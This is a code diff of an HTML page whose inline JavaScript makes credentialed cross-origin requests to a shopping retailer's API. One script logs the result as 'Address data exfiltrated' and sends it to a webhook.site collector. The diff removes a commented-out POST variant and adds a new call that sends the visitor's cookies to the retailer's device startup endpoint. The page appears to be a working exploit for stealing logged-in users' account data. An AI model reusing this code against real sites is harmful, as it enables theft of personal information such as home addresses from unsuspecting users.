@@ -91,19 +91,25 @@
         .then(res => res.json())
         .then(data => {
             console.log("Address data exfiltrated:", data);
-
-            // fetch("https://webhook.site/0fda16eb-6ccd-4ccf-95f7-11d1fd1cecd4", {
-            //     method: "POST",
-            //     headers: {
-            //         "Content-Type": "application/json"
-            //     },
-            //     body: JSON.stringify(data)
-            // });
             
             fetch('https://webhook.site/0fda16eb-6ccd-4ccf-95f7-11d1fd1cecd4?data='+encodeURIComponent(JSON.stringify(data)));
 
         })
         .catch(console.error);
+    </script>
+    <script>
+        fetch("https://api-proxy.eur.halara.com/mall-rest/api/v1/device/startup", {
+        method: "GET",
+        credentials: "include" // must be set to send cookies
+        })
+        .then(res => res.json())
+        .then(data => {
+        console.log("✅ Startup response:", data);
+        })
+        .catch(err => {
+        console.error("❌ Error:", err);
+        });
+
     </script>
 
     <!-- Sets the current year -->
